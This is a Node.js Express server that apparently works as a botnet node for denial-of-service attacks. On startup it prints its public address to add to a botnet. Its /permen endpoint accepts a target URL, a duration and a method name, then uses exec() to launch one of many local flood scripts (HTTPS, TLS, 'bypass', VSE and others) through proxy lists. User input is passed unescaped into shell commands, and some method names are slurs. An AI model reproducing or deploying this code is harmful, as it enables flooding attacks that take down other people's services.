const express = require('express');
const { exec } = require('child_process');
const url = require('url');

const app = express();
const port = process.env.PORT || process.env.SERVER_PORT || 5032;
async function fetchData() {
const response = await fetch('https://httpbin.org/get');
const data = await response.json();
console.log(`Copy This Add To Botnet -> http://${data.origin}:${port}`);
return data
}

app.get('/permen', (req, res) => {
  const { target, time, methods } = req.query;
  const sikat = new url.URL(target);
  const slurp = sikat.hostname
res.status(200).json({
    message: 'API request received. Executing script shortly.',
    target,
    time,
    methods
  });

if (methods === 'https') {
	console.log(`recieved`)
    exec(`node ./lib/cache/HTTPS2.js ${target} ${time} 64 5 proxy.txt`);
} else if (methods === 'strike') {
	console.log(`recieved`)
    exec(`node ./lib/cache/StarsXStrike.js GET ${target} ${time} 4 90 proxy.txt --full`);
} else if (methods === 'bypass') {
	console.log(`recieved`)
    exec(`node ./lib/cache/StarsXBypass.js ${target} ${time} 100 4 proxy.txt`);
} else if (methods === 'tls') {   
	console.log(`recieved`)
    exec(`node ./lib/cache/tls.js ${target} ${time} 100 4 proxy.txt`);
} else if (methods === 'ninja') {     
	console.log(`recieved`)
    exec(`node ./lib/cache/StarsXNinja.js ${target} ${time}`);
} else if (methods === 'mix') {        
	console.log(`recieved`)
    exec(`node ./lib/cache/StarsXMix.js ${target} ${time} 100 4 proxy.txt`);
} else if (methods === 'raw') {                 
	console.log(`recieved`)
    exec(`node ./lib/cache/StarsXRaw.js ${target} ${time}`);
} else if (methods === 'browsers') {             
	console.log(`recieved`)
    exec(`node ./lib/cache/StarsXBrowsers.js ${target} ${time} 4 100`);
} else if (methods === 'rape') {                  
	console.log(`recieved`)
    exec(`node ./lib/cache/StarsXRape.js PermenMD ${time} 4 proxy.txt 64 ${target}`)
} else if (methods === 'quantum') {                  
	console.log(`recieved`)
    exec(`node ./lib/cache/new.js ${target} ${time} 64 5 proxy.txt`);
} else if (methods === 'pidoras') {                 
	console.log(`recieved`)
    exec(`node ./lib/cache/344.js ${target} ${time} 100 4 proxy.txt`);
} else if (methods === 'pidoras2') {                 
    console.log(`recieved`)
    exec(`node ./lib/cache/PIDORAS3.js ${target} ${time} 100 4 proxy.txt`);
} else if (methods === 'storm') {                 
    console.log(`recieved`)
    exec(`node ./lib/cache/NUKE.js ${target} ${time} 100 4 proxy.txt`);
} else if (methods === 'xyn') {                 
    console.log(`recieved`)
    exec(`node ./lib/cache/xyn.js ${target} ${time} 32 2 proxy.txt`);
} else if (methods === 'cibi') {                 
    console.log(`recieved`)
    exec(`node ./lib/cache/cibi.js ${target} ${time} 100 4 proxy.txt`);
} else if (methods === 'glory') {                 
    console.log(`recieved`)
    exec(`node ./lib/cache/GLORY.js ${target} ${time} 100 4 proxy.txt`);
} else if (methods === 'vsebypass') {                 
    console.log(`recieved`)
    exec(`node ./lib/cache/VSE.js ${target} ${time} 64 5 proxy.txt bypass ipv6`);
} else if (methods === 'vseflood') {                 
    console.log(`recieved`)
    exec(`node ./lib/cache/VSE.js ${target} ${time} 32 2 proxy.txt flood ipv6`);
} else if (methods === 'proxy2') {                  
	console.log(`recieved`)
    exec(`node ./lib/cache/scrapes.js`);
} else if (methods === 'proxy') {                  
	console.log(`recieved`)
    exec(`node ./lib/cache/scrape.js`);
} else {}
});
app.listen(port, () => {
fetchData()
});
